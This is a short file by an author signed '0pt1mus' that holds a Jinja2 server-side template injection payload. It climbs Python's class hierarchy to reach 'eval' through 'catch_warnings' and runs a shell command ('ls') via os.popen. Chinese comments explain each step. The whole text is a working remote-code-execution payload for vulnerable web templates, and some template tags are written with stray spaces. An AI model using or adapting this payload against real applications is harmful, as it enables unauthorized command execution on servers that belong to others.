'''
@Description: 
@Version: 2.0
@Author: 0pt1mus
@Date: 2020-07-08 17:54:35
@LastEditors: 0pt1mus
@LastEditTime: 2020-07-08 17:55:52
'''
{ % for c in [].__class__.__base__.__subclasses__() % }
{ % if c.__name__ == 'catch_warnings' % }
    { % for b in c.__init__.__globals__.values() % }  
    {% if b.__class__ == {}.__class__ % }        # 遍历基类 找到eval函数
        {% if 'eval' in b.keys() % }    # 找到了
        {{b['eval']('__import__("os").popen("ls").read()')}} # 导入cmd 执行popen里的命令 read读出数据
        { % endif % }
    { % endif % }
    { % endfor % }
{ % endif % }
{ % endfor % }
